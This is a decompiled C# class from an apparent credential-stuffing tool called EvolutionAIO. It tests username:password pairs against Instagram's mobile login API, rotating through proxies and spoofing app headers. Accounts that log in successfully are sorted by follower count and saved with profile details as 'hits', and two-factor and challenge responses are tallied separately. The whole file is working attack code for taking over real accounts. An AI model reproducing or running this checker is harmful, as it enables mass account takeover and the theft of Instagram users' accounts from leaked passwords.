// Decompiled with JetBrains decompiler
// Type: EvolutionAIO.Checkers.Instagram
// Assembly: EvolutionAIO, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: FFBD76CC-A7A1-4682-B132-DAECA7C9FD32
// Assembly location: C:\Users\Pc\Downloads\Evolutionv2\EvolutionAIO.exe

using Leaf.xNet;
using System;
using System.Drawing;
using System.Linq;
using System.Net;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Text.RegularExpressions;

namespace EvolutionAIO.Checkers
{
  internal class Instagram
  {
    public static bool check(string[] s, string proxy)
    {
      if (0 >= Config.config.retries + 1)
        return false;
      while (true)
      {
        try
        {
          using (HttpRequest httpRequest = new HttpRequest())
          {
            proxy = Menu.proxies.ElementAt<string>(new Random().Next(Menu.proxiesCount));
            if (Menu.proxyProtocol == "HTTP")
              httpRequest.Proxy = (ProxyClient) HttpProxyClient.Parse(proxy);
            if (Menu.proxyProtocol == "SOCKS4")
              httpRequest.Proxy = (ProxyClient) Socks4ProxyClient.Parse(proxy);
            if (Menu.proxyProtocol == "SOCKS5")
              httpRequest.Proxy = (ProxyClient) Socks5ProxyClient.Parse(proxy);
            string str1 = Menu.UUIDGen();
            httpRequest.AddHeader("Accept", "*/*");
            httpRequest.AddHeader("User-Agent", "Instagram 134.0.0.25.116 (iPhone10,2; iOS 13_3_1; en_US; en-US; scale=2.88; 1080x1920; 204771128) AppleWebKit/420+");
            httpRequest.AddHeader("Accept-Language", "en-US;q=1");
            httpRequest.AddHeader("X-IG-Capabilities", "36r/Fw==");
            httpRequest.AddHeader("X-IG-App-ID", "1099655813402622");
            httpRequest.AddHeader("X-IG-Connection-Type", "WiFi");
            httpRequest.AddHeader("X-IG-Connection-Speed", "174kbps");
            httpRequest.AddHeader("X-IG-ABR-Connection-Speed-KBPS", "0");
            string str2 = "ig_sig_key_version=5&signed_body=d19e37605ed48b42e495bf082d06a906663ac2a75ebbdd9acbc5c4bd2e5e8107.{\"reg_login\":\"0\",\"login_attempt_count\":\"0\",\"device_id\":\"" + str1 + "\",\"phone_id\":\"" + str1 + "\",\"password\":\"" + s[1] + "\",\"username\":\"" + s[0] + "\"}";
            httpRequest.SslCertificateValidatorCallback += (RemoteCertificateValidationCallback) ((obj, cert, ssl, error) => (cert as X509Certificate2).Verify());
            HttpResponse httpResponse = httpRequest.Post("https://i.instagram.com/api/v1/accounts/login/", str2, "application/x-www-form-urlencoded; charset=UTF-8");
            if (httpResponse.StatusCode == Leaf.xNet.HttpStatusCode.OK || httpResponse.ToString().Contains("logged_in_user"))
            {
              string str3 = Regex.Match(httpResponse.ToString(), "\"username\": \"(.*)\", \"full_name").Groups[1].Value;
              string str4 = Regex.Match(httpResponse.ToString(), "is_private\": (.*), \"profile_pic_url").Groups[1].Value;
              string str5 = Regex.Match(httpResponse.ToString(), "\"is_verified\": (.*), \"has_anonymous_profile_picture").Groups[1].Value;
              string str6 = Regex.Match(httpResponse.ToString(), "\"is_business\": (.*), \"account_type").Groups[1].Value;
              string str7 = Regex.Match(httpResponse.ToString(), "\"has_anonymous_profile_picture\": (.*), \"can_boost_post").Groups[1].Value;
              string str8 = "";
              foreach (Cookie cookie in httpRequest.Cookies.GetCookies("https://i.instagram.com/api/v1/accounts/login/"))
              {
                if (cookie.Name == "csrftoken")
                {
                  string str9 = cookie.Value;
                }
                else if (cookie.Name == "ds_user_id")
                  str8 = cookie.Value;
              }
              httpRequest.ClearAllHeaders();
              httpRequest.AddHeader("Accept", "*/*");
              httpRequest.AddHeader("User-Agent", "Instagram 134.0.0.25.116 (iPhone10,2; iOS 13_3_1; en_US; en-US; scale=2.88; 1080x1920; 204771128) AppleWebKit/420+");
              httpRequest.AddHeader("Accept-Language", "en-US;q=1");
              httpRequest.AddHeader("X-IG-Capabilities", "36r/Fw==");
              httpRequest.AddHeader("X-IG-App-ID", "1099655813402622");
              httpRequest.AddHeader("X-IG-Connection-Type", "WiFi");
              httpRequest.AddHeader("X-IG-Connection-Speed", "370kbps");
              httpRequest.AddHeader("Host", "i.instagram.com");
              httpRequest.AddHeader("X-IG-ABR-Connection-Speed-KBPS", "1");
              httpRequest.AddHeader("Connection", "keep-alive");
              httpRequest.AddHeader("Accept-Encoding", "gzip, deflate");
              if (!httpRequest.Get("https://i.instagram.com/api/v1/users/" + str8 + "/info/?device_id=" + str1).ToString().Contains("follower_count"))
                return false;
              int int32_1 = Convert.ToInt32(Regex.Match(httpResponse.ToString(), "\"follower_count\": (.*), \"following_count").Groups[1].Value);
              int int32_2 = Convert.ToInt32(Regex.Match(httpResponse.ToString(), "\"following_count\": (.*), \"following_tag_count").Groups[1].Value);
              string str10 = Regex.Match(httpResponse.ToString(), "\"media_count\": (.*), \"geo_media_count").Groups[1].Value;
              if (int32_1 >= 1000)
              {
                ++Menu.hits;
                if (Menu.p1 == "2")
                  Colorful.Console.Write(string.Format(" [+] {0}:{1} | Username: {2} ~ Followers: {3}\n", (object) s[0], (object) s[1], (object) str3, (object) int32_1), Color.Green);
                Save.AsResult(nameof (Instagram), "1000+ Follower Capture", string.Format("{0}:{1} | Username: {2} ~ Followers: {3} ~ Following: {4} ~ Posts: {5} ~ Private: {6} ~ Verified: {7} ~ Business: {8} ~ Default PFP: {9}", (object) s[0], (object) s[1], (object) str3, (object) int32_1, (object) int32_2, (object) str10, (object) str4, (object) str5, (object) str6, (object) str7));
                Save.AsResult(nameof (Instagram), "1000+ Follower Hits", s[0] + ":" + s[1]);
              }
              else if (int32_1 == 0)
              {
                ++Menu.frees;
                Save.AsResult(nameof (Instagram), "Frees", s[0] + ":" + s[1] + " | Followers: 0");
                if (Menu.p1 == "2")
                  Colorful.Console.Write(" [/] " + s[0] + ":" + s[1] + " | FREE\n", Color.Yellow);
              }
              else
              {
                if (Menu.p1 == "2")
                  Colorful.Console.Write(string.Format(" [+] {0}:{1} | Username: {2} ~ Followers: {3}\n", (object) s[0], (object) s[1], (object) str3, (object) int32_1), Color.Green);
                Save.AsResult(nameof (Instagram), "Under 1000 Follower Capture", string.Format("{0}:{1} | Username: {2} ~ Followers: {3} ~ Following: {4} ~ Posts: {5} ~ Private: {6} ~ Verified: {7} ~ Business: {8} ~ Default PFP: {9}", (object) s[0], (object) s[1], (object) str3, (object) int32_1, (object) int32_2, (object) str10, (object) str4, (object) str5, (object) str6, (object) str7));
                Save.AsResult(nameof (Instagram), "Under 1000 Follower Hits", s[0] + ":" + s[1]);
                ++Menu.hits;
              }
              return false;
            }
            if (httpResponse.ToString().Contains("The password you entered is incorrect.") || httpResponse.ToString().Contains("invalid_credentials") || (httpResponse.ToString().Contains("{\"message\": \"") || httpResponse.ToString().Contains("The username you entered doesn't appear to belong to an account.")))
              return false;
            if (httpResponse.ToString().Contains("challenge_required"))
            {
              ++Menu.retries;
            }
            else
            {
              if (!httpResponse.ToString().Contains("two_factor_required") && !httpResponse.ToString().Contains("we've reset your password"))
              {
                if (!httpResponse.ToString().Contains("Your account has been disabled"))
                  continue;
              }
              ++Menu.twofa;
              return false;
            }
          }
        }
        catch (Exception ex)
        {
          Save.AsResult(nameof (Instagram), "Errors", ex.ToString());
          if (ex.ToString().Contains("The error on the client side. Status code: 400"))
            return false;
          if (ex.ToString().Contains("The error on the client side. Status code: 429"))
            ++Menu.retries;
          else
            ++Menu.errors;
        }
      }
    }
  }
}
